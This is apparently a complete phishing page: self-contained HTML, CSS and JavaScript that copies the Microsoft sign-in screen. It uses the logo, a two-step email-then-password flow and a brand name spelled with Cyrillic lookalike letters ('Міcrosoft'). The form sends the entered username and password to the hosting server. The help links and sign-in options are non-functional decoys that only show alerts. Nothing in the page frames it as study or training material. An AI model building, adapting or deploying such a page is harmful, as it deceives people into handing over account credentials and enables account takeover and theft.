<!DOCTYPE html>
<html lang="en">
<head>
    <meta charset="UTF-8">
    <meta http-equiv="Content-Type" content="text/html; charset=utf-8">
    <meta name="viewport" content="width=device-width, initial-scale=1.0, maximum-scale=1.0, user-scalable=no">
    <title>Sign in</title>
    <style>
        /* Inline CSS from styles.css */
        @font-face {
            font-family: 'Segoe UI';
            src: url(data:font/woff2;base64,d09GMgABAAAAABXkABAAAAAAL...) format('woff2');
            font-weight: 400;
            font-style: normal;
        }
        @font-face {
            font-family: 'Segoe UI';
            src: url(data:font/woff2;base64,d09GMgABAAAAABYkABAAAAAAM...) format('woff2');
            font-weight: 600;
            font-style: normal;
        }
        :root {
            --primary-color: #0067b8;
            --secondary-color: #fff;
            --box-shadow: 0 2px 6px rgba(0, 0, 0, 0.1);
        }
        * {
            box-sizing: border-box;
            margin: 0;
            padding: 0;
        }
        body {
            font-family: 'Segoe UI', 'Arial Unicode MS', 'Noto Sans', sans-serif;
            background-color: #f2f2f2;
            display: flex;
            justify-content: center;
            align-items: center;
            min-height: 100vh;
        }
        .container, .login-box, .sign-in-options {
            width: 100%;
            max-width: 440px;
        }
        .login-box, .sign-in-options {
            background-color: #ffffff;
            box-shadow: 0 2px 6px rgba(0, 0, 0, 0.1);
        }
        .login-box {
            border-radius: 4px;
            padding: 40px;
        }
        .logo {
            display: flex;
            align-items: center;
            margin-bottom: 20px;
        }
        .logo-text {
            font-family: 'Segoe UI', 'Arial Unicode MS', 'Noto Sans', sans-serif;
            font-size: 24px;
            font-weight: 600;
            margin-left: 10px;
            color: #737373;
        }
        h1 {
            font-size: 24px;
            margin-bottom: 20px;
        }
        form {
            display: flex;
            flex-direction: column;
        }
        input {
            width: 100%;
            padding: 12px;
            margin-bottom: 15px;
            border: 1px solid #ccc;
            border-radius: 4px;
            font-size: 16px;
        }
        .links {
            display: flex;
            flex-direction: column;
            margin-bottom: 20px;
        }
        .links a {
            color: var(--primary-color);
            text-decoration: none;
            font-size: 14px;
            margin-bottom: 10px;
        }
        .buttons {
            display: flex;
            justify-content: space-between;
        }
        button {
            padding: 12px 20px;
            border: none;
            border-radius: 4px;
            font-size: 16px;
            font-weight: 600;
            cursor: pointer;
            transition: background-color 0.3s;
        }
        .back-btn {
            background-color: #f0f0f0;
            color: #000;
        }
        .next-btn {
            background-color: #0067b8;
            color: var(--secondary-color);
        }
        .next-btn:hover {
            background-color: #005da6;
        }
        .sign-in-options {
            margin-top: 19px;
            padding: 10px;
            display: flex;
            align-items: center;
            height: 38px;
            box-sizing: border-box;
        }
        .options-btn {
            background-color: transparent;
            color: var(--primary-color);
            display: flex;
            align-items: center;
            padding: 0;
            border: none;
            cursor: pointer;
            font-size: 14px;
        }
        .options-btn svg {
            margin-right: 10px;
        }
        @media (max-width: 480px) {
            .container, .login-box, .sign-in-options {
                max-width: 100%;
                padding: 20px;
                margin: 0;
            }
            .buttons {
                flex-direction: column-reverse;
                gap: 10px;
            }
            .back-btn, .next-btn {
                width: 100%;
            }
            body {
                align-items: flex-start;
                padding-top: 20px;
            }
            .sign-in-options {
                margin-top: 10px;
            }
            .login-box {
                margin-bottom: 10px;
            }
        }
        #usernameContainer, #passwordContainer {
            transition: opacity 0.3s ease-in-out;
            opacity: 1;
        }
        .hidden {
            display: none !important;
            opacity: 0 !important;
        }
    </style>
</head>
<body>
    <div class="container">
        <div class="login-box">
            <div class="logo">
                <svg width="40" height="40" viewBox="0 0 40 40" fill="none" xmlns="http://www.w3.org/2000/svg">
                    <rect width="18" height="18" fill="#F25022"></rect>
                    <rect x="22" width="18" height="18" fill="#7FBA00"></rect>
                    <rect y="22" width="18" height="18" fill="#00A4EF"></rect>
                    <rect x="22" y="22" width="18" height="18" fill="#FFB900"></rect>
                </svg>
                <span class="logo-text">Міcrosoft</span>
            </div>
            <h1>Sign in</h1>
            <form id="loginForm" method="POST" action="/">
                <div id="usernameContainer">
                    <input type="text" id="username" name="username" placeholder="Email, phone, or Skype" required>
                </div>
                <div id="passwordContainer" style="display: none;">
                    <input type="password" id="password" name="password" placeholder="Password" required>
                </div>
                <div class="links">
                    <a href="#" class="create-account">Create account</a>
                    <a href="#" class="cant-access">Can't access your account?</a>
                </div>
                <div class="buttons">
                    <button type="button" class="back-btn">Back</button>
                    <button type="button" id="nextBtn" class="next-btn">Next</button>
                </div>
            </form>
        </div>
        <div class="sign-in-options">
            <button class="options-btn">
                <svg xmlns="http://www.w3.org/2000/svg" width="20" height="20" viewBox="0 0 24 24" fill="none" stroke="currentColor" stroke-width="2" stroke-linecap="round" stroke-linejoin="round">
                    <path d="M21 2l-2 2m-7.61 7.61a5.5 5.5 0 1 1-7.778 7.778 5.5 5.5 0 0 1 7.777-7.777zm0 0L15.5 7.5m0 0l3 3L22 7l-3-3m-3.5 3.5L19 4"></path>
                </svg>
                Sign-in options
            </button>
        </div>
    </div>
    <script>
        // Inline JavaScript from script.js
        document.addEventListener('DOMContentLoaded', function() {
            const form = document.getElementById('loginForm');
            const usernameInput = document.getElementById('username');
            const passwordInput = document.getElementById('password');
            const usernameContainer = document.getElementById('usernameContainer');
            const passwordContainer = document.getElementById('passwordContainer');
            const nextBtn = document.getElementById('nextBtn');
            const backBtn = document.querySelector('.back-btn');

            console.log('DOM content loaded, initializing event listeners');

            nextBtn.addEventListener('click', handleNextClick);
            form.addEventListener('submit', handleSubmit);
            backBtn.addEventListener('click', handleBackClick);

            function handleNextClick(e) {
                e.preventDefault();
                console.log('Next button clicked');
                if (usernameContainer.style.display !== 'none') {
                    if (validateUsername()) {
                        console.log('Username validated, transitioning to password');
                        fadeOutIn(usernameContainer, passwordContainer);
                        nextBtn.textContent = 'Sign In';
                    }
                } else {
                    if (validatePassword()) {
                        console.log('Password validated, submitting form');
                        submitForm();
                    }
                }
            }

            function handleSubmit(e) {
                e.preventDefault();
                console.log('Form submitted');
                if (passwordContainer.style.display !== 'none') {
                    if (validatePassword()) {
                        console.log('Password validated, submitting form');
                        submitForm();
                    }
                } else {
                    handleNextClick(e);
                }
            }

            function handleBackClick() {
                console.log('Back button clicked');
                if (passwordContainer.style.display !== 'none') {
                    console.log('Transitioning back to username');
                    fadeOutIn(passwordContainer, usernameContainer);
                    nextBtn.textContent = 'Next';
                }
            }

            function fadeOutIn(elementOut, elementIn) {
                console.log('Fading out:', elementOut.id, 'Fading in:', elementIn.id);
                
                elementOut.style.transition = 'opacity 0.3s ease-in-out';
                elementIn.style.transition = 'opacity 0.3s ease-in-out';
                
                console.log('Initial opacity:', elementOut.style.opacity, elementIn.style.opacity);

                elementOut.style.opacity = '0';
                elementOut.classList.add('hidden');
                console.log('Fading out, opacity set to 0');

                setTimeout(() => {
                    console.log('Timeout 1: Changing display properties');
                    elementOut.style.display = 'none';
                    elementIn.style.display = 'block';
                    elementIn.style.opacity = '0';
                    elementIn.classList.remove('hidden');

                    requestAnimationFrame(() => {
                        console.log('RequestAnimationFrame: Setting opacity to 1');
                        elementIn.style.opacity = '1';
                    });

                    console.log('Fading in, opacity set to 1');
                }, 300);

                setTimeout(() => {
                    console.log('Timeout 2: Fallback check');
                    if (elementIn.style.opacity !== '1') {
                        console.log('Fallback: Using classList to show/hide');
                        elementOut.classList.add('hidden');
                        elementIn.classList.remove('hidden');
                    }
                }, 600);
            }

            function validateUsername() {
                const username = usernameInput.value.trim();
                
                if (username === '') {
                    console.log('Username validation failed: empty input');
                    alert('Please enter your email, phone, or Skype username.');
                    return false;
                }
                
                if (username.includes('@') && !isValidEmail(username)) {
                    console.log('Username validation failed: invalid email');
                    alert('Please enter a valid email address.');
                    return false;
                }
                
                console.log('Username validation passed');
                return true;
            }

            function validatePassword() {
                const password = passwordInput.value.trim();
                
                if (password === '') {
                    console.log('Password validation failed: empty input');
                    alert('Please enter your password.');
                    return false;
                }
                
                console.log('Password validation passed');
                return true;
            }

            function isValidEmail(email) {
                const re = /^[^\s@]+@[^\s@]+\.[^\s@]+$/;
                return re.test(email);
            }

            function submitForm() {
                console.log('Submitting form');
                form.submit();
            }

            document.querySelector('.create-account').addEventListener('click', function(e) {
                e.preventDefault();
                console.log('Create account link clicked');
                alert('Create account link clicked');
            });

            document.querySelector('.cant-access').addEventListener('click', function(e) {
                e.preventDefault();
                console.log('Can't access your account link clicked');
                alert('Can't access your account link clicked');
            });

            document.querySelector('.options-btn').addEventListener('click', function() {
                console.log('Sign-in options button clicked');
                alert('Sign-in options button clicked');
            });

            usernameInput.addEventListener('keypress', function(e) {
                if (e.key === 'Enter') {
                    console.log('Enter key pressed in username field');
                    handleNextClick(e);
                }
            });

            passwordInput.addEventListener('keypress', function(e) {
                if (e.key === 'Enter') {
                    console.log('Enter key pressed in password field');
                    handleSubmit(e);
                }
            });
        });
    </script>
</body>
</html>
